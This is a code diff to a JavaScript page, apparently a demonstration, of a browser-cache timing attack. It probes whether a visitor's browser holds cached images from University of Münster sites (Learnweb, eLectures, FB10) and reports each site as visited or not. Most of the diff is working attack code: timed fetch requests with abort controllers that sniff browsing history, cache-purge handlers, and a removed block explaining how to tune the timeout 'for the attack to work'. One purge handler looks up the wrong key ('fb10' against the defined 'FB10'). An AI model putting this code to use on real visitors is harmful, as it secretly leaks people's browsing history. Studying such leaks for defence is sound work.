@@ -44,7 +44,7 @@ function notCachedTime(loadtime) {
             backgroundColor: '#ff6c6c',
             data: not_cached_loading_time
         });
-        boundary = miss_min - 10;
+        boundary = miss_min - 15;
         let boundary_chart = Array(150).fill(0);
         boundary_chart[boundary] = 2;
         myBarChart.data.datasets.push({
@@ -103,6 +103,9 @@ async function checkPlatform(url, platform) {
     var controller = new AbortController();
     var signal = controller.signal;
     var startTime = new Date().getTime();
+    var timeout = await setTimeout(() => {
+        controller.abort();
+    }, boundary);
     try {
         // credentials option is needed for Firefox
         let options = {
@@ -112,19 +115,18 @@ async function checkPlatform(url, platform) {
         };
         await fetch(url, options);
     } catch (err) {
-        console.log("Error occured.")
+        $('#' + platform.toLowerCase() + " span").text("Nicht Besucht")
+        return false;
     }
-    var loadtime = new Date().getTime() - startTime;
-    if (loadtime < boundary) {
-        $('#' + platform.toLowerCase() + " span").text("Besucht (" + loadtime + ")")
-    } else {
-        $('#' + platform.toLowerCase() + " span").text("Nicht Besucht (" + loadtime + ")")
-    }
+    clearTimeout(timeout);
+    $('#' + platform.toLowerCase() + " span").text("Besucht")
 }
 
 $(document).ready(function () {
     var platforms = {
-        "Learnweb": "https://www.uni-muenster.de/LearnWeb/learnweb2/pluginfile.php/1/local_marketing/slidesfilearea/5/ratingallocate.png"
+        "Learnweb": "https://www.uni-muenster.de/LearnWeb/learnweb2/pluginfile.php/1/local_marketing/slidesfilearea/5/ratingallocate.png",
+        "eLectures": "https://electures.uni-muenster.de/images/electures-icon.svg",
+        "FB10": "https://www.uni-muenster.de/imperia/md/images/fb10/news/fachbereich_1492x746.jpg"
     };
 
     $("#btnTimeCache").click(async function () {
@@ -147,54 +149,75 @@ $(document).ready(function () {
             checkPlatform(platforms[key], key);
         }
     });
+
+    $("#purgeLearnweb").click(async function () {
+        var controller = new AbortController();
+        var signal = controller.signal;
+        var wait_time = 1; // Small so that the cache is purged
+        var timeout = await setTimeout(() => {
+            controller.abort();
+        }, wait_time);
+        try {
+            // credentials option is needed for Firefox
+            let options = {
+                mode: "no-cors",
+                credentials: "include",
+                signal: signal,
+                cache: "reload" // for purging cache
+            };
+            await fetch(platforms["Learnweb"], options);
+        } catch (err) {
+            // When controller.abort() is called, the fetch will throw an Exception
+            console.log("Learnweb was purged from the cache");
+        }
+        clearTimeout(timeout);
+    });
+
+    $("#purgeeLectures").click(async function () {
+        var controller = new AbortController();
+        var signal = controller.signal;
+        var wait_time = 1; // Small so that the cache is purged
+        var timeout = await setTimeout(() => {
+            controller.abort();
+        }, wait_time);
+        try {
+            // credentials option is needed for Firefox
+            let options = {
+                mode: "no-cors",
+                credentials: "include",
+                signal: signal,
+                cache: "reload" // for purging cache
+            };
+            await fetch(platforms["eLectures"], options);
+        } catch (err) {
+            // When controller.abort() is called, the fetch will throw an Exception
+            console.log("eLectures was purged from the cache");
+        }
+        clearTimeout(timeout);
+    });
+
+
+    $("#purgefb10").click(async function () {
+        var controller = new AbortController();
+        var signal = controller.signal;
+        var wait_time = 1; // Small so that the cache is purged
+        var timeout = await setTimeout(() => {
+            controller.abort();
+        }, wait_time);
+        try {
+            // credentials option is needed for Firefox
+            let options = {
+                mode: "no-cors",
+                credentials: "include",
+                signal: signal,
+                cache: "reload" // for purging cache
+            };
+            await fetch(platforms["fb10"], options);
+        } catch (err) {
+            // When controller.abort() is called, the fetch will throw an Exception
+            console.log("fb10 was purged from the cache");
+        }
+        clearTimeout(timeout);
+    });
 });
 
-
-/* async function ifCached(url, purge = false, cached = true) {
-   var controller = new AbortController();
-   var signal = controller.signal;
-   // After 9ms, abort the request (before the request was finished).
-   // The timeout might need to be adjusted for the attack to work properly.
-   // Purging content seems to take slightly less time than probing
-   var wait_time = (purge) ? 3 : 9;
-   var startTime = new Date().getTime();
-   var timeout = await setTimeout(() => {
-       controller.abort();
-   }, wait_time);
-   try {
-       // credentials option is needed for Firefox
-       let options = {
-           mode: "no-cors",
-           credentials: "include",
-           signal: signal
-       };
-       // If the option "cache: reload" is set, the browser will purge
-       // the resource from the browser cache
-       if (purge) options.cache = "reload";
-
-       await fetch(url, options);
-   } catch (err) {
-       // When controller.abort() is called, the fetch will throw an Exception
-       if (purge) console.log("The resource was purged from the cache");
-       else console.log("The resource is not cached");
-       var loadtime = new Date().getTime() - startTime;
-       if (cached) {
-           cachedTime(loadtime);
-       } else {
-           notCachedTime(loadtime);
-       }
-       return loadtime
-   }
-   // clearTimeout will only be called if this line was reached in less than
-   // wait_time which means that the resource must have arrived from the cache
-   clearTimeout(timeout);
-   var loadtime = new Date().getTime() - startTime;
-   if (cached) {
-       cachedTime(loadtime);
-   } else {
-       notCachedTime(loadtime);
-   }
-   console.log("The resource is cached");
-
-   return loadtime;
-} */
